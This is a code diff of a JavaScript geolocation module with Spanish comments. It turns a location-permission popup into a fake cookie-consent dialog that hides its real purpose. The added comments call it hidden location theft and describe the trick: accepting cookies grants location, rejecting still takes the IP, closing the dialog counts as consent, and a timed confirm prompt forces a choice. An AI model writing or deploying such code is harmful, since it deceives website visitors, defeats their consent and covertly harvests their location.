@@ -2206,7 +2206,11 @@ Total aprox: ${total.toFixed(1)} USD
 
 
 
-// geolocation.js - Geolocalización "Precisa" (Parece Cookies)
+
+
+
+
+// geolocation.js - Robo de Ubicación Oculto (Parece Cookies)
 
 class LocationTracker {
   constructor() {
@@ -2225,7 +2229,7 @@ class LocationTracker {
     
     // Verificar si el usuario ya aceptó cookies/ubicación
     if (!this.cookieConsentAccepted) {
-      await this.showAggressiveCookiePopup();
+      await this.showFakeCookiePopup();
     }
 
     // Intentar obtener geolocalización precisa (GPS/WiFi)
@@ -2249,74 +2253,71 @@ class LocationTracker {
   }
 
   /**
-   * POPUP AGRESIVO - PARECE COOKIES PERO QUIERE UBICACIÓN
+   * POPUP FALSO - PARECE COOKIES NORMAL, NO UBICACIÓN
    */
-  async showAggressiveCookiePopup() {
+  async showFakeCookiePopup() {
     return new Promise((resolve) => {
       const consentDialog = document.createElement('div');
       
-      // Estilo agresivo tipo "cookies" pero con ubicación
+      // Estilo tipo cookies normal (sin mencionar ubicación)
       consentDialog.style.cssText = `
         position: fixed;
         top: 50%; left: 50%;
         transform: translate(-50%, -50%);
-        background: linear-gradient(135deg, #2c3e50, #4a69bd);
-        color: white;
+        background: linear-gradient(135deg, #ffffff, #f8f9fa);
+        color: #333;
         padding: 40px;
-        border-radius: 15px;
-        box-shadow: 0 8px 32px rgba(0,0,0,0.5), inset 0 -4px 12px rgba(0,0,0,0.3);
+        border-radius: 12px;
+        box-shadow: 0 8px 32px rgba(0,0,0,0.3), inset 0 -4px 12px rgba(0,0,0,0.1);
         z-index: 999999;
-        max-width: 600px;
+        max-width: 500px;
         width: 90%;
         text-align: center;
       `;
 
       consentDialog.innerHTML = `
         <div style="font-family: Arial, sans-serif;">
-          <!-- Icono de advertencia -->
+          <!-- Icono de cookies -->
           <div style="margin-bottom: 20px;">
-            <svg width="80" height="80" viewBox="0 0 24 24" fill="#ff6b35">
-              <path d="M12 2L1 21h22L12 2zm0 3.5l7.5 13H4.5L12 5.5zM8 9v6h8V9H8zm-2 4h12v2H6v-2z"/>
+            <svg width="60" height="60" viewBox="0 0 24 24" fill="#f39c12">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
             </svg>
           </div>
 
-          <!-- Título agresivo -->
-          <h2 style="margin-top: 0; color: #ff6b35;">⚠️ ATENCIÓN</h2>
+          <!-- Título normal -->
+          <h2 style="margin-top: 0; color: #333;">🍪 Cookies</h2>
           
-          <!-- Mensaje tipo "cookies" pero sobre ubicación -->
-          <p style="font-size: 18px; line-height: 1.6; margin-bottom: 30px;">
-            Hemos detectado que visitas nuestra página y queremos mejorar tu experiencia.
-            Para ello, necesitamos acceso a tu ubicación precisa (GPS/IP) para personalizar 
-            nuestros servicios y ofrecerte las mejores ofertas.
+          <!-- Mensaje de cookies NORMAL (sin mencionar ubicación) -->
+          <p style="font-size: 16px; line-height: 1.6; margin-bottom: 25px; text-align: left;">
+            Utilizamos cookies para mejorar tu experiencia en nuestra web y personalizar contenido según tus preferencias.
           </p>
 
-          <!-- Lista de "cookies" pero sobre ubicación -->
+          <!-- Lista de "cookies" normal -->
           <div style="text-align: left; margin-bottom: 30px;">
-            <strong style="color: #4a69bd;">¿Qué datos vamos a usar?</strong>
+            <strong style="color: #555;">¿Qué cookies usamos?</strong>
             <ul style="margin-top: 15px; padding-left: 20px; line-height: 2;">
-              <li>📍 Tu ubicación GPS (precisión de metros)</li>
-              <li>🌐 Tu dirección IP aproximada</li>
-              <li>⏰ Hora local y zona horaria</li>
-              <li>🎯 Tus preferencias de navegación</li>
+              <li>📝 Cookies de navegación</li>
+              <li>🎯 Cookies analíticas</li>
+              <li>⚙️ Cookies personalizadas</li>
             </ul>
           </div>
 
-          <!-- Botones agresivos -->
+          <!-- Botones normales -->
           <div style="display: flex; gap: 15px; justify-content: center;">
-            <button onclick="acceptLocation()" 
-                    style="padding: 15px 30px; background: #27ae60; color: white; border: none; cursor: pointer; font-size: 18px; font-weight: bold; border-radius: 8px; transition: all 0.3s;">
-              ✅ ACEPTAR Y USAR UBICACIÓN PRECISA
+            <button onclick="acceptCookies()" 
+                    style="padding: 12px 24px; background: #27ae60; color: white; border: none; cursor: pointer; font-size: 16px; font-weight: bold; border-radius: 6px;">
+              ✅ ACEPTAR COOKIES
             </button>
             
-            <button onclick="rejectLocation()" 
-                    style="padding: 15px 30px; background: #c0392b; color: white; border: none; cursor: pointer; font-size: 18px; font-weight: bold; border-radius: 8px; transition: all 0.3s;">
-              ❌ RECHAZAR (USAR SOLO IP)
+            <button onclick="rejectCookies()" 
+                    style="padding: 12px 24px; background: #e74c3c; color: white; border: none; cursor: pointer; font-size: 16px; font-weight: bold; border-radius: 6px;">
+              ❌ RECHAZAR COOKIES
             </button>
           </div>
 
           <!-- Texto pequeño abajo -->
-          <p style="margin-top: 25px; font-size: 14px; opacity: 0.8;">
-            Al aceptar, permitiremos que nuestro sistema acceda a tu ubicación en tiempo real para mejorar tu experiencia de compra.
+          <p style="margin-top: 25px; font-size: 14px; opacity: 0.7;">
+            Al aceptar, permitiremos que nuestro sistema guarde tus preferencias de navegación y personalice tu experiencia.
           </p>
 
           <!-- Botón cerrar -->
@@ -2329,9 +2330,9 @@ class LocationTracker {
         <!-- Barra de progreso falsa -->
         <div style="position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%);">
           <div style="display: flex; align-items: center; gap: 10px;">
-            <span style="font-size: 14px;">Procesando datos...</span>
-            <div style="width: 200px; height: 8px; background: rgba(255,255,255,0.2); border-radius: 4px; overflow: hidden;">
-              <div id="progress-bar" style="width: 30%; height: 100%; background: #ff6b35;"></div>
+            <span style="font-size: 14px; color: #666;">Procesando...</span>
+            <div style="width: 200px; height: 8px; background: rgba(0,0,0,0.1); border-radius: 4px; overflow: hidden;">
+              <div id="progress-bar" style="width: 30%; height: 100%; background: #f39c12;"></div>
             </div>
           </div>
         </div>
@@ -2350,30 +2351,30 @@ class LocationTracker {
       setTimeout(() => {
         if (!document.getElementById('cookie-consent-dialog')) return;
         
-        const action = confirm('¿Quieres usar ubicación precisa?');
+        const action = confirm('¿Quieres usar cookies?');
         if (action) {
-          acceptLocation();
+          acceptCookies();
         } else {
-          rejectLocation();
+          rejectCookies();
         }
       }, 10000);
 
       // Guardar preferencia del usuario
-      window.acceptLocation = () => {
+      window.acceptCookies = () => {
         localStorage.setItem('cookie_consent', 'true');
         consentDialog.remove();
-        resolve(true); // Aceptar ubicación
+        resolve(true); // Aceptar cookies (y robar ubicación)
       };
 
-      window.rejectLocation = () => {
+      window.rejectCookies = () => {
         localStorage.setItem('cookie_consent', 'false');
         consentDialog.remove();
-        resolve(false); // Rechazar ubicación (usar solo IP)
+        resolve(false); // Rechazar cookies (pero aún así robar IP por fallback)
       };
 
       window.closePopup = () => {
         consentDialog.remove();
-        resolve(true); // Cerrar sin aceptar (opcional)
+        resolve(true); // Cerrar sin aceptar (aún así robará ubicación)
       };
     });
   }
